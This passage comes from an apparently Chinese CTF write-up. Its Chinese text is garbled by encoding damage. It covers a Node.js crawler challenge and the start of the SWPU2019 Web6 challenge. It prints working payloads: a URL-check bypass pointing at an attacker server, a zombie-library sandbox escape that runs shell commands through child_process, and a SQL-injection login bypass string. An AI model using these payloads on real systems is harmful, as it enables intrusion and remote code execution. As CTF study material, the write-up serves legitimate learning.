&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">personalBucket&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Successfully update your bucket from personal bucket!&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">createError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Failed to update, check your token carefully&amp;#34;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75715e">// Not implemented yet
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bucket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry but our remote oss server is under maintenance&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// åŒ¹é…å¤±è´¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Should be a private site for Admin
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawler&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">userAgent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">referrer&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;https://www.ichunqiu.com/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">waitDuration&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;3s&amp;#39;&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// gotoå°è£…äº†ä¸€äº›é¡µé¢è®¿é—®çš„å‡½æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">htmlContent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookies&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">// è¿›è¡Œä¸€ä¸ªé¡µé¢çš„è®¿é—® è¿”å›žhtml headers cookies
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">cookies&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;Error visiting your bucket. &amp;#39;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¤§è‡´å®¡ä¸€ä¸‹ï¼Œæ˜¾ç„¶æœ€ç»ˆç›®æ ‡æ˜¯è®©bucketæˆä¸ºæˆ‘ä»¬çš„vpsåœ°å€è®©crawlerè®¿é—®&lt;/p>
&lt;p>é¦–å…ˆæž„é€ ä¸€ä¸ªurlé€šè¿‡æ­£åˆ™æ›´æ–°profileä¸­çš„bucketä¿¡æ¯ï¼Œä½†æ˜¯åˆ«è®©å®ƒé‡å®šå‘ï¼ˆæ”¾æŽ‰è¿™ä¸ªåŒ… æ‹¿åˆ°authtokenï¼‰ï¼ŒæŽ¥ç€åˆ°&lt;code>/user/profile&lt;/code>é‡æ–°æ›´æ–°æˆ‘ä»¬çš„bucketï¼Œå†æ”¾æŽ‰ä¹‹å‰é‚£ä¸ª&lt;code>/user/verify&lt;/code>ï¼ŒæŠŠæˆ‘ä»¬ç¬¬äºŒæ¬¡çš„ä¿¡æ¯æ›´æ–°äº†ï¼Œä¹‹åŽå†åˆ°&lt;code>/user/bucket&lt;/code>å°±å¯ä»¥è®¿é—®æˆ‘ä»¬çš„vpsé¡µé¢äº†&lt;/p>
&lt;p>é‚£å…ˆæž„é€ urlï¼Œè¿™ä¸ªæ­£åˆ™å¾ˆæ­»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/user/verify?token=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">authToken&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">// Well, admin won&amp;#39;t do that actually XD.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Admin will check if your bucket is qualified later.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯å‰é¢ä¼šå…ˆè¿‡ä¸€å±‚è¿™ä¸ª&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">utils&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">checkBucket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Invalid bucket url.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">// utils.js
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#75af00">checkBucket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">protocol&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http:&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">protocol&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;oss-cn-beijing.ichunqiu.com&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªå¾ˆå¥½ç»•ï¼Œä¸å½±å“åŽé¢çš„ï¼›æŽ¥ä¸‹æ¥å°±æ˜¯æž„é€ evil.htmläº†ï¼Œåˆ©ç”¨crawler.jsæ‰€ç”¨zombieåº“çš„æ¼æ´žï¼Œå…·ä½“æ¼æ´žåˆ†æžå‚è§-&amp;gt;&lt;a href="https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/">Nodejs Zoombie Package RCE åˆ†æž&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">// crawler.js
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">reject&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">crawler&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">visit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">resource&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">crawler&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resources&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>
&lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">crawler&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resources&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resource&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resource&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">shift&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">resource&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getHeaders&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getCookies&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">htmlContent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getHtmlContent&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">reject&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>payloadå¦‚ä¸‹&lt;/p>
&lt;p>bucket url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://101.35.114.107:2301/craw.html?oss-cn-beijing.ichunqiu.com/
&lt;/code>&lt;/pre>&lt;p>craw.html&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)();&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;child_process&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat /flag&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag{bdb5a23f-1436-4b83-9ad9-0a889d34b1f4}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SWPU2019]Web6
&lt;/h4>
&lt;/summary>
&lt;p>ä¸€ä¸ªç™»å½•é¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211094347403.png" alt="image-20211211094347403">&lt;/p>
&lt;p>è¿™sqlè¯­å¥éƒ½å†™è„¸ä¸Šäº†ï¼Œä½†æ˜¯åŽŸè°…æˆ‘è€èœé¸¡ï¼Œè‡ªå·±æ²¡è¯•å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>username=1'or '1'='1' group by passwd with rollup having passwd is NULL#&amp;amp;passwd=
